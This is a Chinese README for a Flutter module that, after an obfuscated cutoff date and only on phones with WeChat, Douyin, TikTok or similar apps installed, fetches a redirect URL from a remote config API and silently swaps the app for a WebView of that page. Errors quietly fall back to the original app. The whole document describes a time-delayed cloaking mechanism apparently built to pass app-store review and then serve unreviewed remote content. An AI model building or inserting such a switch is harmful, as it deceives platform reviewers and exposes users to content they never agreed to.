# 应用检测功能说明

## 功能概述

这个功能实现了以下逻辑：
1. 生成时间戳并判断手机时间是否大于指定时间戳
2. 检测是否安装了微信、抖音、拼多多、TikTok、YouTube等应用
3. 如果条件满足，请求指定接口获取跳转URL
4. 根据返回结果决定是否使用WebView加载页面

## 文件结构

```
lib/
├── services/
│   └── app_detection_service.dart          # 核心检测服务
├── core/
│   ├── managers/
│   │   └── app_detection_manager.dart      # 检测管理器
│   └── utils/
│       └── app_detection_example.dart      # 使用示例
├── presentation/
│   └── pages/
│       └── webview_page.dart               # WebView页面
└── main.dart                               # 主入口文件（已集成）
```

## 核心组件

### 1. AppDetectionService
- 负责具体的检测逻辑
- 包含时间戳验证、应用检测、网络检查、接口请求等功能
- 支持iOS和Android平台

### 2. AppDetectionManager
- 管理检测流程
- 提供简单的API供其他组件调用
- 处理检测结果并进行相应的页面跳转

### 3. WebViewPage
- 用于显示从接口获取的URL内容
- 包含加载状态、错误处理、刷新功能
- 支持标题动态更新

## 使用方法

### 方法1: 自动集成（推荐）
代码已经集成到 `main.dart` 中，应用启动时会自动进行检测。

### 方法2: 手动调用
```dart
import 'package:your_app/core/managers/app_detection_manager.dart';

// 在需要的地方调用
final widget = await AppDetectionManager.checkAndRedirect(
  originalApp: YourOriginalApp(),
  context: context,
);

// 使用返回的widget
Navigator.pushReplacement(
  context,
  MaterialPageRoute(builder: (context) => widget),
);
```

### 方法3: 启动时检测
```dart
await AppDetectionManager.performStartupCheck(context, originalApp);
```

## 配置说明

### 时间戳配置
在 `AppDetectionService` 中修改 `_timestampThreshold` 常量。现在使用数字和字母混合的字符串，系统会自动提取其中的数字作为时间戳：
```dart
// 从字符串中提取数字: 1704067200 (2024-01-01 00:00:00 UTC)
static const String _timestampThreshold = 'x1y7z0a4b0c6d7e2f0g0h';
```

时间戳提取规则：
- 系统会提取字符串中的所有数字字符
- 按顺序连接成完整的时间戳数字
- 例如：'x1y7z0a4b0c6d7e2f0g0h' → '1704067200'

### 目标应用配置
修改 `_iosUrlSchemes` 和 `_androidPackages` 来配置需要检测的应用：
```dart
// iOS URL Schemes
static const Map<String, String> _iosUrlSchemes = {
  'weixin://': '微信',
  'snssdk1128://': '抖音',
  // 添加更多应用...
};

// Android 包名
static const List<String> _androidPackages = [
  'com.tencent.mm', // 微信
  'com.ss.android.ugc.aweme', // 抖音
  // 添加更多应用...
];
```

### API接口配置
修改 `_apiUrl` 常量：
```dart
static const String _apiUrl = 'https://www.aistarfire.xyz/api/config?id=6749630370';
```

## 依赖包

确保在 `pubspec.yaml` 中添加了以下依赖：
```yaml
dependencies:
  connectivity_plus: ^6.0.5
  webview_flutter: ^4.9.0
  url_launcher: ^6.3.0
  http: ^1.4.0
```

## 平台特定配置

### iOS配置
在 `ios/Runner/Info.plist` 中添加URL Schemes查询权限：
```xml
<key>LSApplicationQueriesSchemes</key>
<array>
    <string>weixin</string>
    <string>snssdk1128</string>
    <string>pinduoduo</string>
    <string>musically</string>
    <string>youtube</string>
</array>
```

### Android配置
如果需要在Android上检测应用，可以添加 `device_apps` 包并在 `android/app/src/main/AndroidManifest.xml` 中添加权限：
```xml
<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
```

## 调试信息

在调试模式下，服务会输出详细的日志信息，包括：
- 时间戳验证结果
- 应用检测结果
- 网络状态检查
- API请求响应

## 注意事项

1. **网络检测**: 如果没有网络连接，系统会每秒重试一次，直到网络可用
2. **错误处理**: 任何检测过程中的错误都会导致进入原项目，确保应用的稳定性
3. **平台差异**: iOS和Android的应用检测方式不同，iOS使用URL Schemes，Android使用包名检测
4. **隐私权限**: 在iOS 14+上，URL Schemes检测可能受到限制，需要在Info.plist中声明

## 测试建议

1. 在不同的网络环境下测试（WiFi、移动网络、无网络）
2. 测试安装和未安装目标应用的情况
3. 测试API接口返回不同数据的情况
4. 测试时间戳边界条件

## 故障排除

如果功能不正常工作，请检查：
1. 网络连接是否正常
2. API接口是否可访问
3. 平台特定的权限配置是否正确
4. 目标应用的URL Schemes或包名是否正确
5. 查看调试日志获取详细错误信息